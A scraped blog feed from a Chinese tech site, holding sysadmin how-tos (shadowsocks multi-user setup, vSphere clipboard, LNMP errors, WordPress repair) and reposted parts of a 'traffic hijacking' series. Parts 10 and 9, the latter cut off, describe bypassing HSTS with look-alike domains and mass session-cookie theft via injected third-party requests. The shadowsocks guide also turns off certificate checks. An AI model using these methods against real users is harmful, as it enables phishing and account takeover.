Machine距离真实机器的距离更远（抽象层次更高）。在运行时，Python会检测在main.py的当前目录中有没有MyPython.pyc文件，如果没有那么导入MyPython.py并且同时生成MyPython.pyc为下次更快的导入做好准备。这样，可以减少不少初始化的时间。而且，这一切无需用户介入，Python会自动完成。 虽然Python是一个非常成功的语言，但是也有必要明白它的局限性。 运行效率低下 目前为止，Python可以说是所有主流脚本语言中速度最慢的。(是这样么?待考.)这与其脚本引擎的设计思路有关。 如果你的应用对于速度有着较高的要求，就要考虑Python是否能满足需要。不过这一点可以通过使用C编写关键模块，然后由Python调用的方式加以部分解决。 很多人认为Python很慢（Python开发人员尽量避开不成熟或者不重要的优化。一些针对非重要部位的加快运行速度的补丁通常不会被合并到Python内。）。不过，根据二八定律，大多数程序对速度要求不高。在某些对运行速度要求很高的情况，Python程序员倾向于使用JIT技术，或者用使用C/C++语言改写这部分程序。目前可用的JIT技术是Pysco。Cython可以将Python代码转换成C代码。 多线程支持欠佳 Python支持多线程，但是其运行效率也不高。 独特的语法 这也许不应该被称为局限，但是它用缩进来区分语句关系的方式还是给很多初学者带来了困惑。 即便是很有经验的Python程序员，也可能陷入陷阱当中。最常见的情况是tab和空格的混用会导致错误，而这是用肉眼无法分别的。 无类型 作为一种动态语言，随时随地创建和使用变量是Python给我们带来的巨大的便利。但是它也会使得程序不严谨，某些错误只有在运行中才可能出现。所以，使用Python编程的时候，要对类型做到心里有数。这也使得Python的IDE工具无法提供便利的自动完成等功能。 可以参考百度百科和博文： Python的优点 简单 Python是一种代表简单主义思想的语言。阅读一个良好的Python程序就感觉像是在读英语一样。它使你能够专注于解决问题而不是去搞明白语言本身。 易学 Python极其容易上手，因为Python有极其简单的语法。 免费、开源 Python是FLOSS（自由/开放源码软件）之一。使用者可以自由地发布这个软件的拷贝、阅读它的源代码、对它做改动、把它的一部分用于新的自由软件中。FLOSS是基于一个团体分享知识的概念。 高层语言 用Python语言编写程序的时候无需考虑诸如如何管理你的程序使用的内存一类的底层细节。 可移植性 由于它的开源本质，Python已经被移植在许多平台上（经过改动使它能够工作在不同平台上）。这些平台包括Linux、Windows、FreeBSD、Macintosh、Solaris、OS/2、Amiga、AROS、AS/400、BeOS、OS/390、z/OS、Palm OS、QNX、VMS、Psion、Acom RISC OS、VxWorks、PlayStation、Sharp Zaurus、Windows CE、PocketPC、Symbian以及Google基于Linux开发的android平台。 解释性 一个用编译性语言比如C或C++写的程序可以从源文件（即C或C++语言）转换到一个你的计算机使用的语言（二进制代码，即0和1）。这个过程通过编译器和不同的标记、选项完成。 运行程序的时候，连接/转载器软件把你的程序从硬盘复制到内存中并且运行。而Python语言写的程序不需要编译成二进制代码。你可以直接从源代码运行程序。 在计算机内部，Python解释器把源代码转换成称为字节码的中间形式，然后再把它翻译成计算机使用的机器语言并运行。这使得使用Python更加简单。也使得Python程序更加易于移植。 面向对象 Python既支持面向过程的编程也支持面向对象的编程。在“面向过程”的语言中，程序是由过程或仅仅是可重用代码的函数构建起来的。在“面向对象”的语言中，程序是由数据和功能组合而成的对象构建起来的。 可扩展性 如果需要一段关键代码运行得更快或者希望某些算法不公开，可以部分程序用C或C++编写，然后在Python程序中使用它们。 可嵌入性 可以把Python嵌入C/C++程序，从而向程序用户提供脚本功能。 丰富的库 Python标准库确实很庞大。它可以帮助处理各种工作，包括正则表达式、文档生成、单元测试、线程、数据库、网页浏览器、CGI、FTP、电子邮件、XML、XML-RPC、HTML、WAV文件、密码系统、GUI（图形用户界面）、Tk和其他与系统有关的操作。这被称作Python的“功能齐全”理念。除了标准库以外，还有许多其他高质量的库，如wxPython、Twisted和Python图像库等等。 规范的代码 Python采用强制缩进的方式使得代码具有较好可读性。 Python的局限 强制缩进 这也许不应该被称为局限，但是它用缩进来区分语句关系的方式还是给很多初学者带来了困惑。 单行语句和命令行输出问题 很多时候不能将程序连写成一行，如import sys;for i in sys.path:print i。而perl和awk就无此限制，可以较为方便的在shell下完成简单程序，不需要如Python一样，必须将程序写入一个.py文件。","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python","slug":"python","permalink":"https://sobaigu.com/tags/python/"}]},{"title":"Centos下安装shadowsocks-manyuser多用户版本带前端详细教程","slug":"shadowsocks-manyuser","date":"2015-07-12T04:06:05.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"shadowsocks-manyuser.html","permalink":"https://sobaigu.com/shadowsocks-manyuser.html","excerpt":"本站VPS上一直运行着shadowsocks,之前一直是私用的,朋友同学啥的需要,总要分享出去,然后发现账号不知道被流转了多少圈…有必要装个多用户版. 之前有几篇笔记,有需要的可以看: 搭建shadowsocks-libev服务端教程","text":"本站VPS上一直运行着shadowsocks,之前一直是私用的,朋友同学啥的需要,总要分享出去,然后发现账号不知道被流转了多少圈…有必要装个多用户版. 之前有几篇笔记,有需要的可以看: 搭建shadowsocks-libev服务端教程 本教程安装的是shadowsocks-manyuser多用户版,安装过程及方法大同小异,直接上步骤吧. step1.安装必要环境 1[root@localhost ~]# yum install python-pip git m2crypto 会提示 No package python-pip available. 一般pip是找不到的,所以我们需要其他方法安装pip 1[root@localhost ~]# wget https://bootstrap.pypa.io/get-pip.py 1234Resolving bootstrap.pypa.io... 199.27.79.175Connecting to bootstrap.pypa.io|199.27.79.175|:443... connected.ERROR: certificate common name “*.c.ssl.fastly.net” doesn’t match requested host name “bootstrap.pypa.io”.To connect to bootstrap.pypa.io insecurely, use ‘--no-check-certificate’. 已经提示了,认证不通过,我们去掉认证过程下载 1[root@localhost ~]# wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate 通过python安装就可以了 1[root@localhost ~]# python get-pip.py 通过上面的python脚本,会一并将setuptools也安装好,详见pip官方文档.接下来安装cymysql 1[root@localhost ~]# pip install cymysql 其他mysql和php之类的就不多说了,vps装起来一般都会有,不想麻烦直接装lnmp之类的一键搞定. step2.安装shadowsocks 1[root@localhost ~]# git clone -b manyuser https://github.com/mengskysama/shadowsocks.git 一路顺畅,应该不会有什么问题,shadowsocks拉下来了,把默认数据库信息配置好. 123[root@localhost ~]# cd shadowsocks/shadowsocks/[root@localhost shadowsocks]# vi Config.py Config.py里面的内容按实际情况进行修改. 1234567891011#ConfigMYSQL_HOST = &#x27;127.0.0.1&#x27; //前端数据库地址MYSQL_PORT = 3306 //前端数据库端口MYSQL_USER = &#x27;ssss&#x27; //前端数据库用户名MYSQL_PASS = &#x27;ssss&#x27; //前端数据库密码MYSQL_DB = &#x27;shadowsocks&#x27; //前端数据库库名MANAGE_PASS = &#x27;sssssss&#x27;#if you want manage in other server you should set this value to global ipMANAGE_BIND_IP = &#x27;127.0.0.1&#x27; //管理服务器ip#make sure this port is idleMANAGE_PORT = 23333 //管理端口 保存退出,至此,整个shadowsocks安装完毕,快去启动shadowsocks吧. 1234#后台运行shadowsocks-manyusernohup python /root/shadowsocks/shadowsocks/server.py#添加到开机启动echo “nohup python /root/shadowsocks/shadowsocks/server.py” &gt;&gt; /etc/rc.d/rc.local step3.安装前端 git项目地址：https://github.com/orvice/ss-panel 下载地址：https://github.com/orvice/ss-panel/archive/master.zip 导入其中sql文件夹下面的所有数据库到你自己建立的数据库中，（之前应该已经建立了ss数据库），修改lib/config-sample.php（里面填写你的数据库信息）并改为：config.php即可。 修改默认配置即可。 后台默认信息： 后台地址：/admin 帐号：admin 密码：12345678","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"剪贴板复制和粘贴在 vSphere Client 4.1 和更高版本中不工作","slug":"clipborad-in-vsphere-client-cli","date":"2015-07-11T05:09:40.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"clipborad-in-vsphere-client-cli.html","permalink":"https://sobaigu.com/clipborad-in-vsphere-client-cli.html","excerpt":"vmserver升级后,虚拟机复制粘贴功能没了,使用很不方便.官网上搜了下,原来是剪贴板复制和粘贴在 vSphere Client 4.1 和更高版本中不工作… 为了能够在客户机操作系统和远程控制台之间进行复制和粘贴，您必须使用 vSphere Client 启用“复制”和“粘贴”选项。或者，您可以使用 RDP（远程桌面协议）连接到 Windows 虚拟机。","text":"vmserver升级后,虚拟机复制粘贴功能没了,使用很不方便.官网上搜了下,原来是剪贴板复制和粘贴在 vSphere Client 4.1 和更高版本中不工作… 为了能够在客户机操作系统和远程控制台之间进行复制和粘贴，您必须使用 vSphere Client 启用“复制”和“粘贴”选项。或者，您可以使用 RDP（远程桌面协议）连接到 Windows 虚拟机。 要为特定虚拟机启用此选项，请执行以下操作： 使用 vSphere Client 登录到 vCenter Server 系统并关闭虚拟机。 选择虚拟机，然后单击摘要选项卡。 单击编辑设置。 导航到选项 &gt; 高级 &gt; 常规，然后单击配置参数,单击添加行,在“名称”和“值”列中键入下列值： 名称 值 isolation.tools.copy.disable FALSE isolation.tools.paste.disable FALSE 注意：这些选项会覆盖客户机操作系统的 VMware Tools 控制面板中所做的任何设置。 单击确定关闭“配置参数”对话框，然后再次单击确定关闭“虚拟机属性”对话框。 启动此虚拟机。 注意：如果您使用 vMotion 将虚拟机迁移到已设置 isolation.tools.*=&quot;FALSE&quot; 的主机，则会自动激活此虚拟机的复制和粘贴选项。 要为 ESX/ESXi 主机上的所有虚拟机启用此选项，请执行以下操作： 以根用户身份登录到 ESX/ESXi 主机，对/etc/vmware/config 进行备份，然后使用文本编辑器打开/etc/vmware/config文件。 将下列条目添加到此文件中： 12isolation.tools.copy.disable=&quot;FALSE&quot;isolation.tools.paste.disable=&quot;FALSE&quot; 保存并关闭该文件。 注意：升级后，这些选项不会继续存在。如果您在启用这些选项后升级到新版本，这些更改将会丢失，您可能需要重新启用它们。 原文:http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=2074735","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Pureftpd提示502错误解决502 Bad Gateway","slug":"pureftpd-response-502-bad-gateway","date":"2015-07-06T23:07:16.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"pureftpd-response-502-bad-gateway.html","permalink":"https://sobaigu.com/pureftpd-response-502-bad-gateway.html","excerpt":"","text":"把VPS服务器系统重新恢复了,一切环境都重新搭建,图方便,用了最新的LNMP1.2一键安装包.安装完成后各种问题: 1.绑定多个虚拟主机只有1个能访问正确的目录,其他访问到了默认目录 2.pureftpd网页访问时提示&quot;502 Bad Gateway&quot; 3.php-fpm进程占用100%cpu 4.网站首页打开为空白 针对以上问题,进行了一一排查,排查结果如下,如有遇到,可做参考. 问题1.原因不明 这个问题查了各种资料,反复尝试配置虚拟主机,重启nginx,但都一个样子,最终把nginx重装,居然好了… 如果遇到此类问题,除了重装程序,建议检查以下配置: [root@localhost conf]#/usr/local/nginx/sbin/nginx -t //-t会自动检查配置正确性 [root@localhost conf]#cat nginx.conf [root@localhost conf]# ll vhost/ [root@localhost vhost]# cat sobaigu.com.conf [root@localhost ~]#cat /usr/local/php/etc/php.ini [root@localhost ~]#cat /usr/local/php/etc/php-fpm.conf 如果以上检查下来都没问题,那就重装程序试试吧,一些莫名其妙的问题. 问题2…user.ini限制的问题 LNMP1.2的更新说明中,有这个说明 使用网站根目录下的.user.ini来替代原来在php.ini中的防跨目录设置； 也就是说这个文件是用来防止跨目录的,但ftp目录本来就是个子目录,为啥登陆会受影响,不知道,打开此文件,将其中的配置删除或注释掉即可. [root@localhost web]# chattr -i .user.ini [root@localhost web]# vi .user.ini #open_basedir=/home/wwwweb/web:/tmp/:/proc/ 注释掉后重启PHP程序. 问题3.不知原因 在pureftpd无响应返回502时,伴随php-fpm占用100%CPU,停止浏览器请求即可,用strace程序也没抓到啥有用的东西,顺道把php-fpm.conf里的一些参数依照网上的资料做了些修改,具体效果未知. [root@localhost default]# cat /usr/local/php/etc/php-fpm.conf [global] pid = /usr/local/php/var/run/php-fpm.pid error_log = /usr/local/php/var/log/php-fpm.log log_level = notice [www] listen = /tmp/php-cgi.sock listen.backlog = -1 listen.allowed_clients = 127.0.0.1 listen.owner = www listen.group = www listen.mode = 0666 user = www group = www pm = dynamic pm.max_children = 50 pm.start_servers = 5 pm.min_spare_servers = 5 pm.max_spare_servers = 20 request_terminate_timeout = 100 request_slowlog_timeout = 5 slowlog = var/log/slow.log 问题4.主题的问题 因为用的不是系统默认主题,恢复网站只是把数据库恢复了,而用到的主题并没有一并上传安装,此时登陆网站后台,将对应的主题上传安装或启用默认主题即可. 网站迁移,更换服务器等等注意事项可参考:网站备份,迁移 更多502的问题可以参考:http://bbs.vpser.net/viewthread.php?tid=1144&amp;amp;highlight=502","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"解决数据库错误导致网站打不开问题","slug":"wp-allow-repair","date":"2015-06-29T01:02:17.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"wp-allow-repair.html","permalink":"https://sobaigu.com/wp-allow-repair.html","excerpt":"最近贴了比较多的文章,设定的定时发布,可老是有发布失败的情况发生,登上去看的时候手动重新发布一次,这个问题一直没在意. 今日再登博客,却无法打开了,提示: 一些数据表不可用。也许需要修复数据库。","text":"最近贴了比较多的文章,设定的定时发布,可老是有发布失败的情况发生,登上去看的时候手动重新发布一次,这个问题一直没在意. 今日再登博客,却无法打开了,提示: 一些数据表不可用。也许需要修复数据库。 很明显,数据库坏了,我们需要修复数据库.如果不想自己手动操作,可以按提示让WordPress自动进行修复. 要允许本页面自动修复数据库问题，请将下面一行加入您的wp-config.php文件。完成后请刷新本页面。 1define(&#x27;WP_ALLOW_REPAIR&#x27;, true); 手动修复的话,请登录到数据库管理后台,一般用的phpMyAdmin工具,那么我们登录数据库后台后,选择博客对应的数据库,选择修复即可. 点击数据库,进入数据表管理界面; 全选数据表 选中项&gt;优化,修复 这样就大功告成了,数据库还是建议定期备份,以免彻底损坏或丢失无法挽回. 定时自动备份详见搜索WordPress自动备份工具","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"流量劫持系列11_浅谈网站流量劫持防范措施","slug":"traffic-hijack-web-hijack","date":"2015-06-21T01:37:17.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-web-hijack.html","permalink":"https://sobaigu.com/traffic-hijack-web-hijack.html","excerpt":"","text":"前几天上网打开163首页时，发现页面底部莫名其妙的出现一个边框。这在以前可是未曾有过的，而且以后也绝不可能会有这么丑陋的设计。 趋于好奇心，立刻在边框上点了右键审查元素。尼玛，不看不知道，网易首页的HTML何时变得这么劣质了？ 没有doctype声明，连title元素都没有。script还是language=JScript风格，这得追溯到多少个世纪前了~ 最劣质的是框架居然还是&lt;frameset&gt;元素。。。 不用说，这显然不是网易的页面。页面里的ad字样，早已深深的出买了它，这就是个广告页面！ 话说生在天朝，对于各种劫持早已司空见惯。 在网页里劫持广告，油价2块钱一升的时代就有了，过了世界末日依旧存在，说明其中的利益是巨大的。 不用计算，用手指估算下就知道了。我朝有好几亿电脑和手机用户，每天有无数个网页被打开。哪怕在1%的网页里插一个广告，都有数百上千万次的展示数量，其中的商机不言而喻。。。 尽管对此有些无奈，但只要插入的广告不影响正常上网，也没什么意见。如果水平够高，完全可以伪装成页面里本来的广告，至少形式上一样，看不出任何的破绽。这样非但不BS，反倒会有些佩服。 然而，至今见过的各种广告劫持代码，简直一个比一个劣质。这一次见到的，算是垃圾中的战斗机了。随便找个网页编辑器，自动生成的HTML也比这强多了，再随便找些css稍微修饰下，完全就不会被一眼看出是山寨套牌网页了。尼玛的这本身就是暗地里的干活，却没有任何简单的加密混淆，还光明正大的明文写着广告字样，这不是赤果果的秀智商下限吗？ 不过今天既然花时间吐槽这破玩意，就干脆再深入的讨论讨论未来可能还会出现的变招。 最常见的：把被劫持的网页套在自己的空壳里。 其实这样做的目的很明确，让广告显示在浏览器的最上方。一般为了达到这个效果，会把广告显示在页面的右下角，盖住被劫持页面的滚动条，看起来就像是浮动在浏览器之外一样！ 这招够狠，乍一看，还真以为是QQ之类的软件弹出的消息框呢。不过_只要把浏览器窗口退出最大化，顺便再拖一下窗口，广告也跟着动起来了，假李鬼就瞬间原形毕露了！ 防范措施 这种劫持毫无技术含量可言，反劫持也相当容易。只要在自己网页里验证下window.top，是不是在合法的URL列表里。如果不是，那就不允许被内嵌在其他网页内。更好的办法就是把top地址提交到后台服务器上，统计下究竟有哪些网站套了自己的页面。 在返回网页里插入外链脚本 这种做法相比之前的，要隐蔽的多，至少不会把人家网页的源文件给替换了。 当然，如果仅仅是在网页的最后面插入&lt;script&gt;，那还是能被瞬间揭穿，甚至会报毒，因为这太山寨了！有哪个正常的网页会在&lt;/html&gt;后面跟内容呢？只有挂马的脚本。。。 不过，要是放对地方，还真不能一眼看出。例如把广告的&lt;script src=&quot;&quot;&gt;插在&lt;head&gt;&lt;/head&gt;其中的密密麻麻引用外部js的地方，至少能混上一段时间了。 防范措施 一般来说，插入的&lt;script&gt;大多都是外链形式的，这样广告变换会比较灵活。对于这种劫持，就要使用类似杀毒软件扫描可疑模块的原理。 广告不管怎样插，最终都会以静态HTML留在网页里，这是不容抹去铁证！ 当我们的网页HTML加载完毕，触发DOMContentLoaded时，我们可以开始扫描一遍DOM内所有的&lt;script&gt;标签。如果发现有不在信任列表里的src，那么网页很有可能被注入了可疑的脚本！ 我们可以提交可疑脚本的url到后台服务器，做进一步认证。如果确实有风险，那么必须弹出警告框提醒用户。 在返回网页里插入内置脚本 相比外链的脚本，内置的就棘手的多。外链的url域名的总是那么几个，可以简单的实现过滤。但内置脚本就千变万化了！随机变量名，插入废代码，各种玄乎。。。不过，魔高一尺，道高一丈~ 防范措施 想最简单的对付这种劫持，我们必须预先默认个规定，来识别真假脚本元素。我们给自己的&lt;script&gt;元素设置个固定的标签，例如&lt;script myjs=&quot;true&quot;&gt;。当然具体的标签名和值是经常变动的，对于劫持程序来说，显然不知道会有这么个规矩，仍然傻乎乎的插入&lt;script&gt;...&lt;/script&gt; 于是在之后的&quot;肃反运动&quot;中，可以直接清洗掉了。。。 在返回网页的脚本里混入广告代码 随着劫持程序不断升级，招数会变的越来越狠。说不定某天，劫持程序内置一个html语义分析器，智能的把广告脚本合并混淆到页面原先的js里！ 若要真是这样，那么之前说的给自己的脚本元素加上特征码也无济于事了。因为特务已深深的混入到了我们内部，真真假假很难被识别！ 最致命的是，脚本未必都是放在&lt;script&gt;&lt;/script&gt;，也有可能是&lt;element onxxx=&quot;&quot;&gt;的内联形式。。。这下麻烦大了，我得想想怎么解决。。。 防范措施 对于这种情况，还真找不到一个简单的方法来识别。唯一能走通的路，就是在发布HTML时，记录下文件的Hash值。可以把值写入网页，或者存在数据库里。 当网页内容加载完成时，我们通过ajax再次读取当前页面的内容（一般来说读的就是当前页面的缓存数据）。通过同样的算法算出页面的校验值，和原始值一比对，就知道页面是否被第三方篡改了。 我们还可以把篡改过的html发到后台，找出字符串差异部分，让技术人员分析分析到底做了哪些手脚。 当然，这只限于静态网页。 在返回网页的外链脚本里混入广告代码 这招可算是终极篇 — 它完全不修改任何HTML内容！ 然而，一般的网页多多少少要外链几个js文件吧。于是，那些外链的脚本就成了香饽饽的肥肉被盯上了！ 当然也可以像验证html那样，事先计算出所有的js文件的hash值，然后再使用ajax重新读数据认证比对。 不过可别忘了，外链js的路径可以是任意的，而ajax只能读取同源站点。而且，外链的&lt;script&gt;也无法读取其text内容。于是当我们使用站点外的js文件时，劫持程序可以肆无忌惮的从中混入代码！ 防范措施 由于受到沙箱策略的严格控制，我们根本无法获得外部js内的实际内容，所以：走为上。尽量不使用外部站点的js文件。 对于自己站点，但不是同个域名的，可以使用Flash的URLLoader跨域加载，只需部署一个crossdomain.xml即可。 劫持程序过滤掉了我们的反劫持代码 这样的劫持已经超越人类了，赶紧派一个神做了它吧。。。 暂时就YY到这里，以后有新的想法或更好的解决方案，继续来这里补充。 大家有什么巧妙的检测方法，欢迎留言～ 上面说了一大堆，其本质无法就是在客户端，把使用到的资源和服务器原始资源二进制校验，将出现问题的资源反馈给后台记录，找出安全隐患。 虽然这里假象嵌入的仅仅是广告脚本，然而这种脚本拥有和页面内其他脚本一样的权限，因此可以轻而易举的获得用户的cookie。 嵌入的脚本甚至可以通过WebSocket连接到黑客控制台，发送你的鼠标和键盘的一举一动，以及页面上显示的内容；对方还可以远程控制，让js在页面里悄悄执行各种意想不到的操作。。。 原文:http://www.cnblogs.com/index-html/archive/2012/12/23/web_hijack.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[]},{"title":"流量劫持系列10_躲避HSTS的HTTPS劫持","slug":"traffic-hijack-hsts","date":"2015-06-13T11:37:29.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-hsts.html","permalink":"https://sobaigu.com/traffic-hijack-hsts.html","excerpt":"","text":"前言 HSTS 的出现，对 HTTPS 劫持带来莫大的挑战。 不过，HSTS 也不是万能的，它只能解决 SSLStrip 这类劫持方式。但仔细想想，SSLStrip 这种算劫持吗？ 劫持 vs 钓鱼 从本质上讲，SSLStrip 这类工具的技术含量是很低的。它既没破解什么算法，也没找到协议漏洞，只是修改和代理了明文的封包而已。 如果说劫持，要保持源站点不变才算的话，那 SSLStrip 并没做到。根据同源的定义，&lt;协议, 主机名, 端口&gt; 三者必须相同。显然它修改了协议，因此并非在源站点上劫持，而是进入了另个不同的站点。 既然站点都不同，那就属于钓鱼网站了。 但这种钓鱼之所以会如此隐蔽，和大家的常理有关：对大部分用户来说，只要主机名正确那就对了，至于协议和端口，很少有人去关心。 而 SSLStrip 正好利用了人们的认知弱点，确实没有修改网站主机名，从而欺骗了大部分用户。 因此更确切的说，这就是一种高级钓鱼。 进一步钓鱼 由于 HSTS 这种反钓鱼的机制出现，即使蒙的了用户，但也骗不过浏览器。 HSTS 正是以主机名为单位的。在新的版本里，甚至还支持所有子域名（includeSubDomains）。 如果还抱有侥幸心理，期望能过滤首次的 HSTS 头，那么 Preloading HSTS 能让浏览器天生就记住某些网站。彻底打消 SSLStrip 的念头。。。 不过，刚刚也说了，SSLStrip 本质就是网站钓鱼。既然都钓鱼了，何必这样鬼鬼祟祟的反倒被发现，为何不正大光明的钓？ 反正钓鱼考的就是用户眼力，不如再进一步，干脆把主机名也改了吧！眼力不好的人，可能还是看不出破绽。 例如，将原本 https://www.alipay.com 的链接，跳转到 http://www.alipay.cn 这个钓鱼网站，仍会有不少用户觉察不到。 而 www.alipay.cn 这个虚假的主机名，显然不会在 HSTS 白名单中，因此又可以无限劫持了！ 在流量劫持的环境里，任何明文数据都是可控的。即使访问 www.alipay.cn 这种不存在的域名，中间人也可模拟 DNS 应答，从而可伪造出各种看起来相似的钓鱼站点。 在之前那篇 《SSLStrip 的未来 —— HTTPS 前端劫持》 中，我们是在 URL 的 Query 中进行伪装的： 虽然修改了 URL，但主机名没变，因此仍躲不过 HSTS。 所以，我们需要将 symbol 标记转移到域名里： 将页面中出现的 HTTPS 域名稍作修改，就是完全不同的一个站点了，因此即可彻底摆脱 HSTS 的白名单。 例如把域名都替换成 .cn 的，原本 www.alipay.com 就变成 www.alipay.cn 了，这样即使用户浏览器里存在 HSTS 记忆，那也是之前的，这个临时伪造出来的钓鱼站点，自然不会有的。 尽管站点完全不同，但表面上看起来仍是相似，因此用户仍然不易察觉。 同时，中间人能够识别出域名中的这个被修改过的特征，在转发时还原回先前的域名，进行正常代理。 保留绿色证书 对于大部分用户来说，地址栏里醒目的 HTTPS 绿色证书，是一只强心剂。而 SSLStrip 剥离了协议，显然是不可能出现了。 但如今通过修改主机名，能否要回这个图标？ 如果想有，显然得申请一个合法的证书。但要将所有的 .cn 域名都配上数字证书，肯定是不现实的。 不过既然是钓鱼网站，主机名也可以随意改，何必困死在顶级域名上？ 我们可以申请一个泛域名证书，例如 *.xx.com。这样，将目标站点都套在该二级域名下，即可以 HTTPS 协议进行钓鱼了。 （这里以自签署的证书演示） 虽然域名相比之前差别较大，但有醒目的绿色证书，反而更容易被蒙蔽了。 HSTS 的意义 由于钓鱼的方式可以千变万化，因此 HSTS 也很难从根本上进行防御。 当然，这并不意味 HSTS 没有实际作用。事实上 HSTS 还是能够避免很大部分的风险。其中最典型的，就是用户在地址栏里敲入网址的情况。 在过去，未提供的协议的网址，都是以默认的 HTTP 方式请求，因此在这个入口就有极大的风险。而 HSTS 的出现，很大程度的解决了这个隐患。 如今，像百度这样的大型导流网站，都在逐步支持 HTTPS 升级，从而在入口源头上堵住这个安全隐患。 防御方案 尽管是钓鱼，但也不是完全没有防御方案。 从攻击者的角度来看，如果要为各种站点制作一个钓鱼网站，成本是极大的。而且更新起来也不容易，数据也难以保持实时。 因此，通常是直接代理线上的站点内容。既然这样，不妨在网页中悄悄加入些监控脚本，统计当前页面究竟在哪些域名里出现过，就能快速找出一些钓鱼网站了。 当然，攻击者也可以过滤掉这段监控脚本，这就是后期对抗的事了。 原文:http://www.cnblogs.com/index-html/p/https_hijack_hsts.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"流量劫持系列9_沉默中的狂怒_Cookie 大喷发","slug":"traffic-hijack-mitm-cookie-sniffer","date":"2015-06-08T03:58:33.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-mitm-cookie-sniffer.html","permalink":"https://sobaigu.com/traffic-hijack-mitm-cookie-sniffer.html","excerpt":"","text":"前言 上一篇文章 讲解了如何借助前端技术，打造一个比 SSLStrip 更高大上的工具。 今天我们再次使用这套战术，通过前后端的里应外合，实现一个杀手锏级的攻击方案 —— Cookie 数据大喷发。 传统嗅探 在过去，Cookie 的窃取大多通过嗅探流量来实现。 这种方法具有很强的隐蔽性，让人几乎难以察觉。然而，正因为如此，也面临一个巨大的缺陷：速度太过缓慢。 中间人只能嗅探到用户正在访问的页面，对于那些令人期待的网站，只能慢慢等了。在家庭、办公场所这些稳定的网络环境里，长久的等待或许还能得到想要的结果；但对于公共场所上网的用户，就没那么容易了。 在公共网络里，大家多少保持一些警惕，很少会去访问一些重要的网站。况且，临时的网络用户也不会停留太久。因此纯粹的流量嗅探，难以捕捉到更有意义的数据。 前端出击 既然用户不按我们的套路出牌，那么我们的前端战术就得派上用场了 —— 只要能控制页面，一切皆可由我们做主。哪怕用户就是不中圈套，我们的脚本也可以强制跳转过去，从而轻易拿下想要的 Cookie 数据。 不过强制跳转的方式也太过暴力了。尽管我们使用了劫持页面这种高调的方式，但之后的所作所为，仍需保持隐蔽。 也许你会说可以通过隐藏框架页来代替，就可大幅提升隐蔽性了。这个方式确实不错，离我们的目标又近了一步，但仍然不够完美。为什么非得用访问页面的方式来获取 Cookie，这代价不免也太大了。 事实上，Cookie 的发送和请求类型是没有任何关系的。无论是页面的访问、还是第三方资源的加载，只要目标 URL 匹配了 Cookie 数据库的路径，符合的记录最终都会被带上。或许你平时并没有注意到这一点，但我们可以马上来验证下。 我们先在页面里，发起一个第三方的资源请求： 抓到请求包，自然就获得了其中的 Cookie： 但这些数据究竟是不是完整的，能否直接利用？不多猜测，我们把它粘到其他浏览器里试试： 当我们再次刷新页面时，奇迹发生了： 通过 Cookie，我们成功还原了之前的登录状态。而这一切，仅仅从一个第三方的图片请求中获得！ 所以，中间人可以使用非常轻量的方式，来获取某个站点下的 Cookie，并不需要用户主动访问该站点。 我们可以事先收集大量的网站地址，让前端间谍进行逐一侦探，从而能嗅探到相当一部分账号了： 